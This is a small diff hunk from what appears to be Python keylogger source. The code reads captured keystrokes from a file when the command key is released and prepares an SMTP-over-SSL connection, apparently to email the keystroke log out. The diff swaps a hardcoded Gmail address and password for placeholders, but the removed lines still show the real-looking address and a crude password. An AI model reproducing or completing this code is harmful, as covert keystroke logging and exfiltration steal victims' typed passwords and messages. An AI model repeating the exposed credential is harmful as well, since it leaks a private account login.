@@ -32,8 +32,8 @@ def on_release(Key):
     elif Key == Key.cmd and len(keys) != 0:
         with open('keys.txt', 'r') as fs:
             log = fs.read()
-            email= 'jakehunt000000@gmail.com'
-            password= 'pussypie'
+            email= 'email'
+            password= 'password'
             port=465
             context= ssl.create_default_context()
             try:
